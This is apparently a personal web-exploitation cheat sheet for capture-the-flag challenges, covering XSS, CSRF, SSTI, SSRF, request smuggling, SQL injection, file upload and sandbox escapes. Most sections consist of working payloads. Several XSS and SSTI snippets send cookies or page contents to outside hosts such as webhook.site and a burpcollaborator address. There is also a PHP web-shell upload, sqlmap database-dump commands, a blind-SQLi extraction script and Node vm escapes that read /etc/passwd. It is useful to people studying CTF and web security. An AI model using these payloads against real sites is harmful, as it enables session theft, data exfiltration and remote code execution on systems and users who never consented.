# +

- ./javascript.md
- ./fuzzing.md

- https://github.com/swisskyrepo/PayloadsAllTheThings

- https://portswigger-labs.net/hackability/inspector/index.php?input=window
- [HTML Codes \- Table of ascii characters and symbols](https://ascii.cl/htmlcodes.htm)
- [Unicode/UTF\-8\-character table](https://utf8-chartable.de/unicode-utf8-table.pl)

# information disclosure

[Webhook\.site \- Test, process and transform emails and HTTP requests](https://webhook.site/)

```python
@app.route('/', methods=['GET', 'HEAD', 'POST'])
def index():
    # e.g. Vary, Origin
    print(request.headers)
    print(request.args)
    print(json.dumps(request.json))
    return "OK"

if _name__ == "__main__":
    app.run(host='0.0.0.0', port=80, debug=True, threaded=True)
```

- robots.txt
- client headers
    - https://securityheaders.com/
    - e.g. `user-agent curl/7.19.3` => vulnerable version
        - https://github.com/joshibeast/cft-writeups/blob/master/balccon2020/let_mee_see.txt
- trailing headers - sent after the content with a zero length chunk
    - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Trailer
    ```bash
    curl -k -v -H 'TE: trailers' 'https://foo'
    # ||
    curl -k -v --raw 'https://foo'
    # ||
    printf 'GET / HTTP/1.1\r\nHost: www.foo.com\r\n\r\n' \
        | openssl s_client -ign_eof -connect foo.com:443 -servername www.foo.com
    ```
- page source based on login state
    - anonymous user
    - logged in user
    - admin user
- http methods
    - `nmap -p 443 --script http-methods www.example.com`
    ```
    FOO / HTTP/9.8
    HEAD / HTTP/1.0
        - e.g. page returns 302 for GET, but 200 for HEAD
    OPTIONS / HTTP/1.0
    PROPFIND / HTTP/1.0
    ```
- response status codes
    - e.g. 403 for registered users and 404 for invalid users
- parameter pollution
    1. search?q=foo
    2. search?q=bar
    3. search?q=foo&q=bar (distinct result from previous cases)
- cookies
    - mitigations: http-only, secure
- ssl strip
    - mitigations: Strict-Transport-Security (HSTS)

- https://medium.com/@muratkaraoz/web-app-pentest-cheat-sheet-c17394af773

# prototype pollution

```javascript
Object.prototype.outputFunctionName = 'x;<code>;x'
```

- [GitHub \- msrkp/PPScan: Client Side Prototype Pollution Scanner](https://github.com/msrkp/PPScan)
- [GitHub \- BlackFan/client\-side\-prototype\-pollution: Prototype Pollution and useful Script Gadgets](https://github.com/BlackFan/client-side-prototype-pollution)
- [GitHub \- Kirill89/prototype\-pollution\-explained: Prototype Pollution in JavaScript](https://github.com/Kirill89/prototype-pollution-explained)
    - [Prototype Pollution in lodash | Snyk](https://snyk.io/vuln/SNYK-JS-LODASH-73638)
        - https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf

```html
</pre>
<script type="text/javascript">
RegExp = function() {
    return {'test' : function(){
        return true;
    }}
}
</script>
<input type="text" id="secretbox" value="nop" />
<script id="bla" src="http://challs.ctf.site:10000/safebox/file.js" type="text/javascript" onload="document.location.href='http://doma.in/?s='+document.getElementById('secretbox').value;"></script>
```

Proxy object:

```javascript
RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
          apply: function(target, thisArg, argumentsList) {
              console.log(thisArg.source);
              console.log(argumentsList[0]);
              if((thisArg.source == '^file:\\/\\/.+') && (argumentsList[0] === 'file:///Applications/Calculator.app')){
                return false;
              }
              return Reflect.apply(target, thisArg, argumentsList)
          }
        });
        setTimeout(()=>{
            a = document.createElement("A")
            a.href="file:///Applications/Calculator.app"
            document.body.appendChild(a)
            a.click()
        }, 3000);
```
    - https://blog.redteam.pl/2020/08/rocket-chat-xss-rce-cve-2020-15926.html
    - [#276031 Remote Code Execution in Rocket.Chat Desktop - HackerOne](https://hackerone.com/reports/276031)

# HTTP Parameter Pollution

- http://www.benhayak.com/2019/07/blog-post.html

# DOM clobbering

- https://brutelogic.com.br/blog/filter-bypass-in-multi-context/
    ```
    // breakout from tag + js
    ">'-alert(1)-'<svg>

    // https://brutelogic.com.br/blog/the-easiest-way-to-bypass-xss-mitigations/
    ">';alert(1);'<=svg>

    // breakout from json
    p="><!--
    q=--><svg onload=alert(1)>
    ```
- https://xss.pwnfunction.com/challenges/ww3/
    - https://www.anquanke.com/post/id/197614
    - http://retanoj.github.io/2020/04/18/%E9%A2%98%E7%9B%AE-XSS-2020-04-18-XSS-game-of-pwnfunction-Challenges-WW3/
    - text = `<a><style><style/><script>alert(1337);//</style><form name=notify>`

# cross-site request forgery (CSRF)

- https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery

- Server validates that form request was sent with same CSRF token in user session
    - Extracting token: hardcoded in input / included by js
    ```html
    <img src="http://generateerror.com/does-not-exist.jpg" onerror="javascript:var all_inputs = document.getElementsByTagName('input'); var token = '';for(var i = 0; i < all_inputs.length; i++){if (all_inputs[i].name == 'csrftoken'){token = all_inputs[i].value;}}var iframe = document.createElement('iframe');iframe.src = 'http://ctf.nullcon.net/challenges/web/web4/set_admin.php?user=pepe&csrftoken=' + token + '&Set=Set';document.body.appendChild(iframe);"/>
    ```
    - cache poisoning - avoid revoking CSRF token by triggering errors in script tag sourcing JSONP payload
        ```
        # CORS violation (unmatched domain name, forcing apply to script tag)
        https://milk.chal.seccon.jp./note.php?_=aaaaaaaaaaaa%20crossorigin%3Duse-credentials
        # || misrecognize charset, causing syntax error
        ?_=aaaaaaaaaaaa%20charset%3Dunicodefffe
        # || misinterpret `defer` attribute as value of `aaaa` attribute, causing token callback to not be defined
        ?_=aaaaaaaaaaaa%20aaaa%3D
        # || mismatch in URI check logic to bypass added CSP header
        https://milk.chal.seccon.jp/note.php/.php
        ```
        - [CTFtime\.org / SECCON 2020 Online CTF / Milk / Writeup](https://ctftime.org/writeup/24126)
        - ~/share/ctf/seccon2020/milk-solver.js
- [Multiple vulnerabilities that can result in RCE · Issue \#1122 · Codiad/Codiad · GitHub](https://github.com/Codiad/Codiad/issues/1122)

# command injection

- URL parameter
    - `file="'$(sleep 5)'a.gif`

- https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- [#863956 \[extra-asciinema\] Command Injection via insecure command formatting](https://hackerone.com/reports/863956)
    - [Avoid\-Command\-Injection\-Node\.md · GitHub](https://gist.github.com/evilpacket/5a9655c752982faf7c4ec6450c1cbf1b)

### server-side template injection (SSTI)

- jinja
    ```html
    {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

    <script>
    // Payload: {{ ''.class_.__mro__[1].__subclasses__()[412]("cat server.py", shell=True, stdout=-1).communicate() }}
    fetch('http://localhost:5000/',{
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: "url=1&score=1&feedback=%7B%7B%20%27%27.__class__.__ mro__%5B1%5D.__ subclasses__%2829%5B412%5D%28%22cat%20server.py%22%2Cshell%3DTrue%2Cstdout%3D-1%29.communicate%28%29%20%7D%7D&nam=1"}).then(response => response.text()).then(data => fetch("http://demo.itmo.xyz/?nnn="+encodeURI(data)).then(response => document.write(response)));
    </script>
    ```

- freemarker
    ```java
    // https://ruvlol.medium.com/rce-in-jira-cve-2019-11581-901b845f0f
    $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://avtohanter.ru/rcetest?a=a').waitFor()

    // https://cyc10n3.medium.com/rce-via-server-side-template-injection-ad46f8e0c2ae
    ${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("ls")}
    ```

- spring, thymeleaf
    ```
    // https://github.com/veracode-research/spring-view-manipulation/
    GET /path?lang=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x HTTP/1.1
    ```

- [ZAP-ESUP: ZAP Efficient Scanner for Server Side Template](https://fenix.tecnico.ulisboa.pt/downloadFile/563345090416415/79039-Diogo-silva-thesis.pdf)
    - p. 51: payloads
    - p. 52: polyglot - `<#set($x<%={{={@{#{${xux}}%>)`

# server-side request forgery (SSRF)

- Headers
    - burp: Proxy > Options > Match and Replace
        - Item = Request Header
        - Match = `^X-Forwarded-For.*`
        - Replace = `X-Forwarded-For: 127.0.0.1`
- Request URL with CRLF + Headers
    - http://109.233.61.11:27280/?retpath=/news/%0d%0aX-Accel-Redirect:%20/secret/flag
        - https://www.tasteless.eu/post/2014/02/olympic-ctf-sochi-2014-xnginx-writeup/
- localhost encoding
    ```
    0177.0.0.1
    0000.0000.0000.0000
    ```
    - https://ctf-wiki.github.io/ctf-wiki/web/ssrf/#bypass-posture
    - Mitigation: netmask
- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- [PHP :: Sec Bug \#79329 :: get\_headers\(\) silently truncates after a null byte](https://bugs.php.net/bug.php?id=79329)
- https://github.com/jmdx/TLS-poison/

```bash
curl -v 'https://let-me-see.pwn.institute/' -G --data-urlencode 'url=http://127.0.0.1/?url=http://daffy-malleable-tote.glitch.me/go'
```
- https://glitch.com
    ```javascript
    const express = require("express");
    const app = express();

    app.get("/", (request, response) => {
      response.redirect(301, 'file:///flag.txt')
    });

    const listener = app.listen(process.env.PORT, () => {
      console.log("Your app is listening on port " + listener.address().port);
    });
    ```
- https://pipedream.com/
    - https://docs.pipedream.com/workflows/steps/code/#making-http-requests-from-your-workflow
    - Workflow = HTTP trigger > NodeJS
    ```javascript
    async(event, steps) => {
        $respond({
          status: 301,
          headers: { "Location": "file:///flag.txt" }
        });
    }
    ```
- https://www.netlify.com/blog/2018/09/13/how-to-run-express.js-apps-with-netlify-functions/
- https://devcenter.heroku.com/articles/getting-started-with-nodejs

### Reverse DNS checks

- substring: ctf_host.com.127.0.0.1.attacker_domain.com
- lookup: ctf_host.com.attacker_domain.com resolves to 127.0.0.1
- request: https://ctf_host.com@127.0.0.1/foo

### DNS Rebind

- [DnsFookup](http://rbnd.gl0.eu/dnsbin)
    - record type = A; IP = 93.184.216.34; Repeat = 1
    - record type = A; IP = 127.0.0.1; Repeat = 1

# HTTP Request Smuggling, Desync Bypass

Send request to backend bypassing frontend (e.g. proxy)

```bash
# frontend uses CL, backend uses TE
# - CL matches 2 requests
# - send 2 times, on 2nd expect "Unrecognized method GPOST"
echo -n "POST / HTTP/1.1\r\nHost: ac4d1f4a1e49785a80ae0997008b001c.web-security-academy.net\r\nCookie: session=gexP10lOiJEnEtpU7ew1ROWk8u2RS97A\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG" \
    | openssl s_client -ign_eof -connect ac4d1f4a1e49785a80ae0997008b001c.web-security-academy.net:443

# frontend uses TE, backend uses CL
# - TE matches 2 requests
# - send 2 times, on 2nd expect "Unrecognized method GPOST"
# - 1st req len = 4: 2nd req len value + newline (2 chars + \r\n)
# - 2nd req len = `len(o)-7`: remove payload after 2nd request's headers (\r\n0\r\n\r\n)
echo "POST / HTTP/1.1\r\nHost: ac2b1f971e4e6d0680a69d850033000f.web-security-academy.net\r\nCookie: session=hC2vufpItiaz4fmOv5WWEqCA8yowj0iu\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n""$(python -c 'import re, sys
o = re.sub(b"\n", b"\r\n", open(sys.argv[1], "rb").read())
sys.stdout.buffer.write(bytes(str(hex(len(o)-7))[2:], "ascii") + b"\r\n" + o)' ~/code/snippets/ctf/web/request_smuggling_te_cl.txt)" \
    | openssl s_client -ign_eof -connect ac2b1f971e4e6d0680a69d850033000f.web-security-academy.net:443

# Duplicated headers
~/code/snippets/ctf/web/request_smuggling_cl_cl.txt
```

- https://book.hacktricks.xyz/pentesting-web/http-request-smuggling
- https://www.imperva.com/blog/http-desync-attacks-and-defence-methods/

### Upgrade protocol

- [GitHub \- BishopFox/h2csmuggler: HTTP Request Smuggling over HTTP/2 Cleartext \(h2c\)](https://github.com/BishopFox/h2csmuggler)
    - [h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext \(h2c\)](https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c)

# directory traversal

- writing arbitrary files
    - [extraction path](./forensics.md#extraction-path)

- [Directory Traversal in st | Snyk \- Open Source Security](https://snyk.io/vuln/SNYK-JS-MINHTTPSERVER-608658)
    - https://blog.npmjs.org/post/80277229932/newly-paranoid-maintainers
    - ~/Downloads/st-20140206_0_0_6b54ce2d2fb912eadd31e2c25c65456d2c8666e1.patch

# Cross-Site Scripting (XSS)

- ~/code/snippets/ctf/web/injections.js
- ~/code/snippets/ctf/web/xmlrequest.js

- https://netsec.expert/2020/02/01/xss-in-2020.html
- https://security.stackexchange.com/questions/162436/example-of-reflected-client-xss-which-is-not-dom-based-xss

- `Range: bytes=x-y`: payload contained in interval
    - [CTFtime\.org / Google Capture The Flag 2018 \(Quals\) / bbs / Writeup](https://ctftime.org/writeup/10369)
- Same-origin policy: iframes can access each other's data in same domain
    - Loosened via CORS
    ```javascript
    var d = window.top.frames[0].window.document;
    ```
    - [GitHub \- galdeleon/yolovault: writeup for yolovault challenge \- 33c3 ctf](https://github.com/galdeleon/yolovault)
        - uses timeouts to wait for loaded iframe content
        - ~/code/snippets/ctf/web/yolovault/

DOM-Based:

- Sources: `document.url, document.referrer, location.href`
- Sinks: `element.innerHTML(), eval(), setTimeout(), document.write()`

```html
'"><img src=https://foo>

'"><script>
xmlhttp = new XMLHttpRequest();
xmlhttp.onload = function() {
    x = new XMLHttpRequest();
    x.open('GET', 'https://webhook.site/OF728FeO-d6d8-4195-a627-F80F4Fd8b92d?' + btoa(xmlhttp.response));
    x.send(null);
    //document.write("<img src='https://webhook.site/OF728FeO-d6d8-4195-a627-F80F4Fd8b92d?" + btoa(xmlhttp.responseText) + "'>");
}
xmlhttp.open('GET', '/admin');
xmlhttp.send(null);
</script>

<!-- Vanilla -->
nc -lvp 1000 | tee log.txt
<script> var xhr = new XMLHttpRequest(); xhr.open('GET', "http://johnhammond.org:1000/?content=" + btoa(document.body.InnerHTML), true); xhr.send(); </script>
<script>
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function() {
    document.location="http://vps_ip:23334/?"+btoa(xmlhttp.responseText);
}
xmlhttp.open("GET","http://127.0.0.1:5000/notes?name=Ann Cobb", true);
xmlhttp.send();
</script>

<!-- jQuery -->
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.js'></script><script> var x = $('body').html().toString(); $.post('http://foo/catcher.php', x); </script>

<!-- ES6 -->
<script>fetch('https://webhook.site/OF728FeO-d6d8-4195-a627-F80F4Fd8b92d?' + btoa(document.cookie));</script>
<script>
fetch('http://localhost:5000/notes?name=Angela%20Turner').then(response => response.text()).then(
data => fetch("http://demo.itmo.xyz", {
    method: "POST",
    headers: {
        'Content-Type': 'application/json'
    },"body": JSON.stringify(data)})).then(response => document.write(response));
</script>
```

LFI:

```html
<script>
var xhr = new XMLHttpRequest;
xhr.onload = function() {
	document.write(this.responseText);
};
xhr.open("GET", "file:///etc/passwd");
xhr.send();
</script>
```

- https://github.com/snovvcrash/cheatsheets#xss

Mitigations:

- [Using HTTP cookies \- HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Security)
    - Set-Cookie header
        - SameSite - cookie not sent via cross-origin requests
        - Secure - cookie sent strictly via https
        - HttpOnly - cookie not accessible in js
            - bypass: server-side debug info logging
            ```html
            <?php header("Set-Cookie: SESSIONID=ImAhttpOnlyCookie; path=/; httponly"); ?>
            <a href='phpinfo.php'>aa</a>
            ```
            ~/code/guides/ctf/WebBook/HTTP/XSS学习.md
- [Content Security Policy \(CSP\) \- HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
    - https://csp-evaluator.withgoogle.com
    - bypass: using valid elements/attributes
        - `default-src 'self'; script-src 'self' foo.bar.com 'unsafe-inline';` => `<link rel=prefetch href=//bar.com`
        - `<script>//# sourceMappingURL=https://request/?${escape(document.cookie)}</script>`
            - [Bypass unsafe\-inline mode CSP](https://paper.seebug.org/91/)

Polyglots:

```svg
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="100px" height="100px" viewBox="0 0 751 751" enable-background="new 0 0 751 751" xml:space="preserve">
    <image id="image0" width="751" height="751" x="0" y="0" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo" />
    <script>alert(1)</script>
</svg>

<?xml version="1.0" encoding="UTF-8"?> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="Layer_1" x="0px" y="0px" width="100px" height="100px" viewBox="-12.5 -12.5 100 100" xml:space="preserve">
  ...
  <g>
    <polygon fill="#00B0D9" points="41.5,40 38.7,39.2 38.7,47.1 41.5,47.1 "></polygon>
    <script type="text/javascript">
      var xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          var xhr2 = new XMLHttpRequest();
          xhr2.open("POST", "http://XXXX.burpcollaborator.net/");
          xhr2.send(xhr.responseText);
        }
      }
      xhr.open("GET", "http://web50.zajebistyc.tf/profile/admin");
      xhr.withCredentials = true;
      xhr.send();
    </script>
  </g>
  ...
</svg>

<svg id="rectangle" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
    <script>alert(1)</script>
    <foreignObject width="100" height="50" requiredExtensions="http://www.w3.org/1999/xhtml">
        <embed xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(location)" />
    </foreignObject>
</svg>

<svg>
    <use xlink:href="data:image/svg+xml;base64,
    PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cD
    ovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhs
    aW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW
    5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+
    PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3
    JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0i
    NTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZW
    RFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8x
    OTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dH
    A6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0i
    amF2YXNjcmlwdDphbGVydChsb2NhdGlvbikiIC8+DQ
    ogICAgPC9mb3JlaWduT2JqZWN0Pg0KPC9zdmc+#rectangle" />
</svg>
```

- ~/code/snippets/ctf/web/redirect.svg
- https://lorexxar.cn/2015/11/19/xss-link/
- [CONFidence CTF 2019\-Web 50分析思考 &\#8211; 郁离歌丶的博客](http://yulige.top/?p=665)
    - [SVG XSS的一个黑魔法 · Tuuu Nya&\#39;s Blog](https://www.hackersb.cn/hacker/85.html)

- ~/code/snippets/ctf/web/xss_in_gif.js
- https://github.com/joshibeast/cft-writeups/blob/master/balccon2020/web-Imgr.txt
    ```bash
    exiftool -make "<script>document.location='http://burpcollaboratoridoryourserver?c='+document.cookie</script>" imagefinal.jpg
    ```

# SQL Injection (SQLI)

~/code/src/security/PayloadsAllTheThings/SQL Injection/Intruder

```
' or 1=1 UNION SELECT database(),1 #
' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.columns WHERE table_schema = '' #

User-Agent: ' or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(1) #
User-Agent: ' or 1 group by concat_ws(0x3a,(select group_concat(table_name separator ',') from information_schema.tables where table_schema=database()),floor(rand(0)*2)) having min(1) #

%" UNION SELECT "one", "two"; --%";
%" AND username in (SELECT username FROM sqlite_master where username like "%") --

-- Given 3 columns in table:
telnet'	oorr	1=0	UNION	SELECT	*	FROM	(SELECT	1)	AS	a	JOIN	(SELECT	*	from	flag)	AS	b	JOIN	(SELECT	1)	AS	c;#

-- Error-based query: Output contains string "n1ctf"
-- WAF: preg_match("/get_lock|sleep|benchmark|count|when|case|rlike|count/i",$info)
-- ExtractValue(xml_frag, xpath_expr)
-- UpdateXML(xml_target, xpath_expr, new_xml)
'&&(select extractvalue(rand(),concat(0x3a,((select "n1ctf" from n1ip where 1=1 limit 1)))))&&'
-- ||
'&&(select extractvalue(rand(),0x3a6e31637466))&&'
-- ERROR 1105 (HY000): XPATH syntax error: ':n1ctf'
-- ||
'||(select ip from n1ip where updatexml(1,concat('~',(select if(ascii(substring((select database()),1,1))=100,'n1ctf','r3kapig')),'~'),3))||'
-- ERROR 1105 (HY000): XPATH syntax error: '~n1ctf~'
```
- ~/share/ctf/n1ctf2020/web-signin/
    - https://www.gem-love.com/ctf/2657.html#websignin
    - https://eine.tistory.com/entry/n1ctf-2020-web-signIn-write-up
    - https://github.com/Super-Guesser/ctf/tree/master/N1CTF%202020/web/signin

```bash
sqlmap -u "http://joking.bitsctf.bits-quark.org/index.php" --data="id=1&submit1=submit" -D hack -T Joker -C Flag --dump
sqlmap -u "http://ctf.sharif.edu:35455/chal/hackme/677aa21d5725bb62/login.php" --csrf-token="user_token" --csrf-url="http://ctf.sharif.edu:35455/chal/hackme/677aa21d5725bb62/" --data="username=a&password=a&Login=Login&user_token=" --dump
sqlmap -r seccon.txt  --ignore-401 --dbs --proxy=http://127.0.0.1:8080
sqlmap -r seccon.txt  --ignore-401 --hex --tables -D keiba --proxy=http://127.0.0.1:8080

# String delimiter sqli
sqlmap.py -u http://ctf.sharif.edu:8086/ --method=POST --data="book_selection=a" --cookie="PHPSESSID=my_sess_id" --prefix="9780060878849\'" --technique B --dbms=MySQL --risk=3 --string covers -D book_shop -T books -C book_serial --dump

# Boolean-based blind sqli
sqlmap.py -u http://ctf.sharif.edu:8082/login.php --method=POST --data="username=a&password=b" -p username --technique=B --string injection --dbms=MySQL --risk=3 -D irish_home -T users --dump --prefix="aa\""
```

Replace spaces with parenthesis:

```python
import requests
import string

session = requests.session()
url = "http://202.120.7.197/app.php"
cookie = {"PHPSESSID": "ck8pgb52nkkb8sdg2c95ms7s16"}
flag = ""

for i in xrange(1, 50):
    for j in string.printable:
        if j == "%": continue
        param = {"action": "search", "keyword": "", "order": "if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),{length},1)like({num}),price,name)".format(length=str(i), num=hex(ord(j)))}
        # print param
        res = session.get(url=url, params=param, cookies=cookie)
        content = res.text
        # print content
        if content.find("\"id\":\"5\"") > content.find("\"id\":\"2\""):
            print j
            flag += j
            print flag
            break
```
    - https://www.40huo.cn/blog/0ctf-2017-writeup.html

- https://medium.com/@gregIT/ringzer0team-ctf-sqli-challenges-part-2-b816ef9424cc

# NoSQL Injection

- MongoDB
    - `columnFoo[$regex]=^.foo`
- [GitHub \- codingo/NoSQLMap: Automated NoSQL database enumeration and web application exploitation tool\.](https://github.com/codingo/NoSQLMap)
    - https://www.defcon.org/images/defcon-21/dc-21-presentations/Chow/DEFCON-21-Chow-Abusing-NoSQL-Databases.pdf

# code injection

On: state persisted as objects (e.g. cookie)

```
j:[{"id":1,"body":__FILE__}]
j:[{"id":1,"body":["foo'"]}]
```
    - https://github.com/saw-your-packet/ctfs/blob/master/DarkCTF/Write-ups.md#dusty-notes
        - https://artsploit.blogspot.com/2016/08/pprce2.html

# deserialization

- https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html
- https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-608664
- https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html
- https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet

# Path Traversal / Local File Inclusion (LFI)

- ~/code/guides/ctf/Web-CTF-Cheatsheet/README.md#LFI
- https://book.hacktricks.xyz/pentesting-web/file-inclusion

nginx:

- /etc/nginx/sites-enabled/default
    - https://github.com/Toboxos/ctf-writeups/blob/main/HackTheVote2020/Dotlocker1.md
    - https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/
    ```
    location ^~ /static => /static../foo
    ```

# File Upload

- multipart request
    ```
    Content-Disposition: form-data; name="upfile"; filename="foo.php.png"
    Content-Type: image/gif

    GIF89a;<?system($_GET['cmd']);?>
    ```

- https://book.hacktricks.xyz/pentesting-web/file-upload
- https://d00mfist.gitbooks.io/ctf/content/bypass_image_upload.html
- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload

# Side Channels

- https://snyk.io/blog/node-js-timing-attack-ccc-ctf/

# jail, sandbox, waf, filter bypass

- detection, testing
    - https://regex101.com/
    ```
    /?q='oorr''=''%23
    /?q='oorr/**/1=1/**/%23
    9495 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
    ```
- jsfuck
- https://mathiasbynens.be/notes/javascript-escapes
- `__defineGetter__`
    - https://hack.more.systems/writeup/2014/10/26/hacklu2014-objection/
- alternative for `()`
    - https://portswigger.net/research/javascript
    ```javascript
    alert`1337`in``.sub﻿in''instanceof""
    ```
- alternative for function call
    - https://www.sigflag.at/blog/2020/writeup-angstromctf2020-caasio/
    ```javascript
    window["a"]()
    window["a"].apply(null, [1, 2, 3])
    // typeof o = "string"
    // o.constructor = String
    // String.constructor = Function
    (o=>o.constructor.constructor(
        o.constructor.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101))())(Math+1)
    ```
    - [CTFtime\.org / Hack\.lu CTF 2020 / BabyJS](https://ctftime.org/task/13520)
    ```
    > y
    'constructor'
    > y[y]
    [Function: String]
    > y[y][y]
    [Function: Function]
    > z
    'return e=>console.log(e)'
    > y[y][y](z)
    [Function: anonymous]
    > y[y][y](z)()
    [Function]
    > y[y][y](z)()('foo')
    foo
    undefined
    ```
- sandbox escape
    - if: all objects inside VM context
    - then:
        - https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed
        - throw and catch host exception
        ```javascript
        try {
            this.process.removeListener();
        }
        catch (host_exception) {
            console.log('host exception: ' + host_exception.toString());
            host_constructor = host_exception.constructor.constructor;
            host_process = host_constructor('return this')().process;
            child_process = host_process.mainModule.require("child_process");
            console.log(child_process.execSync("cat /etc/passwd").toString());
        }
        ```
    - else: use `this`
    - https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html
    ```javascript
    this.constructor.constructor('return this.process')().mainModule.require("child_process").execSync('cat * | grep CSR')
    ```
- alternative for `child_process`
    - https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html
    - https://github.com/nodejs/node/blob/master/lib/internal/child_process.js
    ```javascript
    this.proc_wrap = this.constructor.constructor('return this.process.binding')();
    this.Process = this.proc_wrap('process_wrap').Process;
    this.process = new Process();
    this.env = this.constructor.constructor('return this.process.env')();
    this.mproc  = this.constructor.constructor('return this.process')();
    this.sot = this.constructor.constructor('return this.process.stdout')();
    this.sin = this.constructor.constructor('return this.process.stdin')();
    this.rc = process.spawn({file:'/home/guest/flag_reader',args:[],cwd:"/home/guest",windowsVerbatimArguments:false,detached:false,envPairs:this.env, stdio:[mproc.stdin, mproc.stdout, mproc.stderr]});
    ```
- Object.freeze() is shallow
    ```javascript
    Object.freeze(Math);
    (o=>o.trusted=1)(Math.__proto__)
    ```
- php, non alphanumeric
    - https://github.com/ExTi0p/ctf/tree/master/2020/FwordCTF_2020/Jailoo_Warmup
    - https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/
- Content-Type, multipart parsing
    - https://github.com/BlackFan/content-type-research
    - https://soroush.secproject.com/blog/2018/08/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour/
    - https://blog.doyensec.com/2020/08/20/playframework-csrf-bypass.html
    ```
    Content-Type: application/x-www-form-urlencoded;/json
    {"q":"' \u0075nion \u0073elect '1"}
    ```
- url encoding, unicode utf-8 translation levels
    - https://www.cgisecurity.com/lib/URLEmbeddedAttacks.html
    - given `\r\n` in url: http request splitting
        - https://github.com/p4-team/ctf/tree/master/2019-11-14-dragon-finals/cat_flag
        - ~/code/guides/ctf/p4-team-ctf/2019-11-14-dragon-finals/cat_flag/
        ```
        >>> a=sys.stdout.buffer.write(bytes(' '.join([bin(c)[2:].zfill(8) for c in b'\x0d\x0a']), 'latin-1'))
        00001101 00001010
        >>> a=sys.stdout.buffer.write(bytes(' '.join([bin(c)[2:].zfill(8) for c in b'\xe0\xb4\x8a']), 'latin-1'))
        11100000 10110100 10001010
        ```
- HTTP Path Normalization, IDNA
    ```
    http://nginx：80/flag.php
    http://＠nginx/flag.php
    http://nginx／flag.php
    http://a:.@✊nginx:80.:/flag.php
    // ACE = http://a:.xn--@nginx:80-5s4f.:/flag.php
    ```
        - Alternative: DNS Rebinding
        ```
        GET /?url=http://ocu.chal.seccon.jp:10000/flag.php
        ---
        localhost.my_server A   (vulnerable_ip)
        localhost.my_server A   (my_server_ip)
        ---
        GET /?url=http://localhost.my_server/flag.php
        ```
        - [CTFtime\.org / SECCON 2019 Online CTF / Option\-Cmd\-U](https://ctftime.org/task/9540)
    ```
    Location: https:\\foo.com/bar
    ```
        - https://samcurry.net/abusing-http-path-normalization-and-cache-poisoning-to-steal-rocket-league-accounts/
- DNS tunnel
    - https://github.com/iagox86/dnscat2
- cache poisoning
    - https://owasp.org/www-community/attacks/Cache_Poisoning
- https://haboob.sa/ctf/nullcon-2019/babyJs.html
